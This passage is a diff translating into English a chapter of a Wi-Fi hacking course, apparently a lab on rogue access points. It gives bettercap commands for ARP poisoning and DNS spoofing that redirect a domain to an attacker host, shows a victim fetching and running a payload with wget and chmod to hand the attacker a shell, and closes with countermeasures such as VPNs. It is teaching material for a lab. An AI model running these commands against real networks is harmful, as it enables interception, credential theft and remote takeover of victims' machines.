+Once the service is launched, the only thing left is to redirect the traffic for `carlos.web.com` (this was also done in the [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#dns-spoofing-para-robo-de-credenciales) chapter) to the newly created website at `10.5.2.192:80`. However, this time `ettercap` will not be used, since it does not work very well when the victims are located on 2 different interfaces (`wlan4` and `wlan5`). Instead, a similar tool called `bettercap` will be used to perform `DNS Spoofing`, interfering with the domain `carlos.web.com` and changing it to the malicious website.
+```bash
+# In another terminal (force channel for aireplay)
 docker-compose exec attacker-1 bash
-# Iniciar la herramienta de spoofing
+# Start the spoofing tool
 bettercap -iface wlan5
 ```
-* `-iface:` interfaz desde la cual se ejecuta (debe ser la que aloja el punto de acceso para poder ver a las víctimas)
-```
-# Una vez dentro (aconsejable copiar uno a uno)
-net.probe on                            # Escaneo activo de red (se aprecian los dispositivos conectados en este caso)
-net.recon on                            # Reconocimiento activo y pasivo de la red (es posible que ya se haya hecho en el paso anterior)
-arp.spoof on                            # Envenenar caches/tablas ARP (obligan que 10.5.2.193 se gw, aunque ya lo es)
-set dns.spoof.domains carlos.web.com    # Definir dominio que será interceptado
-set dns.spoof.address 10.5.2.193        # Definir IP a la que se redirige cuando se intenta acceder al dominio seleccionado
-dns.spoof on                            # Empezar ataque DNS Spoofing
+* `-iface:` interface from which it is run (it must be the one hosting the access point so it can see the victims)
+```bash
+# Once inside (it is advisable to copy them one by one)
+net.probe on                            # Active network scan (connected devices can be seen in this case)
+net.recon on                            # Active and passive network reconnaissance (it may already have been done in the previous step)
+arp.spoof on                            # Poison ARP caches/tables (they force 10.5.2.193 to be gw, although it already is)
+set dns.spoof.domains carlos.web.com    # Define the domain that will be intercepted
+set dns.spoof.address 10.5.2.193        # Define the IP to which access to the selected domain will be redirected
+dns.spoof on                            # Start DNS Spoofing attack
 ```
 <img width="1080" height="446" alt="image" src="https://github.com/user-attachments/assets/972309f4-f82f-47e2-b7a3-77d25fe44928" />
 
-Finalmente, se ve como se descarga el malware al acceder al dominio mencionado:
-```
+Finally, it can be seen how the malware is downloaded when the mentioned domain is accessed:
+```bash
 wget http://carlos.web.com/
-# Es necesario ejecutarlo en este caso de forma manual
+# In this case it is necessary to execute it manually
 chmod +x index.html
 ./index.html
 ```
-**Cliente:**
+**Client:**
 <img width="1788" height="391" alt="image" src="https://github.com/user-attachments/assets/ed95ceac-a03f-4077-a63f-34b4ed9c3042" />
 <img width="768" height="99" alt="image" src="https://github.com/user-attachments/assets/d774d290-7c45-4426-9508-f35a6d8bedae" />
 
-**Atacante:**
+**Attacker:**
 <img width="625" height="164" alt="image" src="https://github.com/user-attachments/assets/84d5a264-e9ee-4a6f-b704-ab7a2093edf0" />
 <img width="994" height="388" alt="image" src="https://github.com/user-attachments/assets/d32ccb39-0590-482d-a084-868ba5585b25" />
 <img width="967" height="118" alt="image" src="https://github.com/user-attachments/assets/d03fce93-0070-4546-a474-d667d177c39b" />
 
-`Nota: ` Este ataque es posible al estar comentado en la cache local (`/etc/hosts`) la referencia del dominio `carlos.web.com` a la IP `10.5.0.20`.
+`Note:` This attack is possible because the reference in the local cache (`/etc/hosts`) mapping the domain `carlos.web.com` to the IP `10.5.0.20` is commented out.
 
-En este caso se ejecuta de forma manual, ya que se trata de una simulación de un caso real simplificada para observar los peligros que proporcionan los puntos de acceso falsos. Observando cómo conseguimos una consola en la víctima.
+In this case, it is executed manually, since it is a simplified simulation of a real case intended to observe the dangers posed by fake access points. This shows how we manage to obtain a console on the victim.
 
-Normalmente se usaría la herramienta `Set` vista en el capítulo [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks) para crear un clon de una web visitada habitualmente por las víctimas (se puede observar el tráfico de estos como se vio al probar con `ettercap` y `tcpdump`) que luego se complementa con el malware creado. Este tipo de acciones normalmente te devuelve la página legítima junto a un pop-up que al aceptarlo descarga y ejecuta dicho malware (es necesaria la acción de aceptar, pero suele ser creíble):
+Normally, the `Set` tool seen in the [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks) chapter would be used to create a clone of a website frequently visited by the victims (their traffic can be observed as shown when testing with `ettercap` and `tcpdump`), which is then complemented with the created malware. This type of action normally returns the legitimate page along with a pop-up that, when accepted, downloads and executes the malware (the acceptance step is necessary, but usually believable):
 <img width="670" height="557" alt="image" src="https://github.com/user-attachments/assets/43729f1f-44bb-4180-b35e-4a25462766e3" />
-Sin embargo, en este laboratorio se opta por una adaptación mucho más sencilla debida a las limitaciones del laboratorio.
 
-Con esto se aprecia la importancia de conectarnos al punto de acceso correcto e ignorar otros que puedan resultar atractivos por su nombre cómo `MOVISTAR_XXX_PLUS_PLUS` o `MOVISTAR_XXX_6G`, los cuales pueden ser propiedad de un usuario malintencionado que se intenta aprovechar del desconocimiento para hacer un ataque MITM. En este caso no se ha estudiado una conexión por error humano como la mencionada, lo cual es más difícil de controlar por parte de los usuarios, sin embargo, esto también recalca la importancia de hacer las configuraciones de seguridad correctas, sobre todo por los administradores de red en las organizaciones que manejan datos delicados. 
+However, in this lab a much simpler adaptation is chosen due to the limitations of the lab.
 
-`Nota: ` Se recomienda investigar cómo se pueden realizar los ataques de tipo MITM con las condiciones especiales del `Rogue AP` para ampliar el conocimiento adquirido. 
+This highlights the importance of connecting to the correct access point and ignoring others that may look attractive because of their name, such as `MOVISTAR_XXX_PLUS_PLUS` or `MOVISTAR_XXX_6G`, which may belong to a malicious user trying to take advantage of lack of knowledge to perform a MITM attack. In this case, a mistaken connection due to human error, such as the one mentioned, has not been studied, which is more difficult for users to control. Even so, this also reinforces the importance of making the correct security configurations, especially for network administrators in organizations that handle sensitive data.
 
-`Pista: ` En este caso no hace falta especificar las IPs de las víctimas, es más conveniente usar el mod (`ettercap -T -i wlan5`), ya que el jugar con 2 interfaces en el atacante puede complicar el uso de `ettercap`. También se recomienda investigar más a fondo otras herramientas como la recientemente vista (`bettercap`).
+`Note:` It is recommended to investigate how MITM-type attacks can be carried out under the special conditions of a `Rogue AP` in order to expand the knowledge acquired.
 
+`Hint:` In this case, it is not necessary to specify the victims’ IPs; it is more convenient to use the mode (`ettercap -T -i wlan5`), since working with 2 interfaces on the attacker can complicate the use of `ettercap`. It is also recommended to investigate more deeply other tools such as the one just seen (`bettercap`).
 
-### Contramedidas y Recomendaciones
-En cuanto a las protecciones ante este ataque, no basta simplemente con estar atentos a los nombres de las redes a las cuales nos conectamos (a no ser que sean realmente sospechosas de ser falsa), sino que hay que adoptar otras medidas más fuertes. Una buena idea sería evitar la opción de conectarse automáticamente a cualquier red, lo cual no es lo más cómodo en cuanto a usabilidad se refiere, pero podría llegar a ayudar para evitar la imitación de redes típicas (por ejemplo, nombres de puntos de acceso por defecto de las compañías telefónicas). Por otro lado, también se podría intentar limitar el área de alcance del dispositivo que imparte la red al área de la oficina u hogar donde se usa, de forma que solo tengan acceso los que tienen acceso físico a ese lugar. Esto no es nada fácil, pero nuevas tecnologías como WiFi 6 van encaminadas hacia ello.
+### Countermeasures and Recommendations
+As for protections against this attack, it is not enough simply to pay attention to the names of the networks we connect to (unless they are truly suspicious of being fake); stronger measures must be adopted. One good idea would be to avoid the option of connecting automatically to any network, which is not the most convenient in terms of usability, but could help avoid imitation of typical networks (for example, default access point names from telecom providers). On the other hand, it could also be useful to try to limit the coverage area of the device providing the network to the office or home where it is used, so that only those with physical access to that place can reach it. This is not easy at all, but new technologies such as WiFi 6 are moving in that direction.
 
-En cambio, la opción más realista de todas es el uso de una [`VPN`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/config#vpn) que cree una red cifrada y segura en una red que no tenga por qué serlo. Esto hace que cualquier información que los usuarios envíen se trasmita por un canal seguro, aunque atraviese una red o dispositivo que no lo sea. Por tanto, su uso sería especialmente aconsejado cuando queramos hacer una comunicación con datos sensibles, no siendo tan necesario en ocasiones en las cuales se visite el periódico local, por ejemplo. También serían interesantes las opciones vistas en el [capítulo anterior](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-RADIUS#contramedidas-y-recomendaciones) consistentes en el refuerzo de las configuraciones que limitan los puntos de acceso a los que nos conectamos (sobre todo en entornos más grandes administrados por una persona especializada).
+In contrast, the most realistic option of all is the use of a [`VPN`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/config#vpn) that creates an encrypted and secure network over one that does not necessarily have to be secure. This makes any information users send travel through a secure channel, even if it crosses a network or device that is not secure. Therefore, its use is especially advisable when making communications with sensitive data, while being less necessary in cases such as visiting the local newspaper, for example. Also interesting are the options seen in the [previous chapter](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPA/WPA2-RADIUS#contramedidas-y-recomendaciones), which consist of reinforcing the configurations that limit the access points to which we connect (especially in larger environments managed by a specialized person).
 
-Por último, se debe recalcar la importancia de ajustar las medidas y el nivel de seguridad a las necesidades de cada caso, ya que, en ciertas ocasiones, como en entornos del hogar no tendría sentido un excesivo nivel de seguridad con las versiones Enterprise, por ejemplo. Sin embargo, en estos casos no se debe dejar de lado la seguridad por completo, sino que es de vital importancia activar aquellas configuraciones que no comprometan la usabilidad. Sin embargo, en el caso de empresas u organizaciones, si cupiese dedicar más tiempo y recursos a cuidar en mayor profundidad la seguridad de sus redes y dispositivos, haciendo incluso auditorias cada cierto tiempo. Como ya se ha visto, un atacante puede hacer mucho daño a una empresa, a sus trabajadores o a los clientes que le dan la confianza de manejar sus datos. Por tanto, es muy importante que el nivel de seguridad se ajuste a las necesidades, en especial al tratar con datos sensibles de terceros.
+Finally, the importance of adjusting measures and security level to the needs of each case must be stressed, since in certain situations, such as home environments, an excessively high level of security using Enterprise versions would not make sense, for example. However, in these cases security should not be neglected completely; instead, it is vitally important to enable those configurations that do not compromise usability. In contrast, in the case of companies or organizations, it would make sense to dedicate more time and resources to taking greater care of the security of their networks and devices, even carrying out audits from time to time. As has already been seen, an attacker can do a great deal of damage to a company, its employees, or the clients who trust it with their data. Therefore, it is very important that the security level be adjusted to the needs of each case, especially when dealing with sensitive third-party data.
 
-`Nota: ` El laboratorio construido tiene mucho más potencial que limitarse a los ataques mostrados, de tal forma que se recomienda encarecidamente su uso para seguir aprendiendo y mejorando las habilidades como auditor. Incluso, sería posible ampliarlo o adaptarlo para la puesta en prueba de algún ataque que necesite de alguna configuración especial o que no se considere. Para ello se recomienda la lectura del capítulo [config](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/config), donde se pretende dar una visión más detallada de la construcción del laboratorio.
+`Note:` The lab that has been built has much more potential than just being limited to the attacks shown, so its use is strongly recommended in order to continue learning and improving auditor skills. It could even be expanded or adapted to test an attack requiring some special configuration or one not considered here. For that purpose, it is recommended to read the [config](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/config) chapter, where a more detailed view of how the lab was built is intended to be provided.
 
-
-[`Lección anterior, cracking de redes WPA/WPA2 EAP`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-RADIUS)
+[`Previous lesson, cracking WPA/WPA2 EAP networks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPA/WPA2-RADIUS)
